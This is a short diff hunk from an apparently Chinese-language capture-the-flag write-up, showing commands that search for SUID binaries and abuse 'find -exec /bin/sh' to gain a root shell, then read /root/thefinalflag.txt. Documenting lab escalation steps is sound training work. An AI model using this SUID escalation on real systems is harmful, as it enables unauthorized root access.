@@ -163,7 +163,7 @@ find / -perm -u=s -type f 2>/dev/null
 
 两种方法：
 find . -exec /bin/sh \;  # 直接提权
-find flag4.txt -exec "/bin/sh" \; # x
+find flag4.txt -exec "/bin/sh" \; 
 ls /root
 cat /root/thefinalflag.txt
 ```
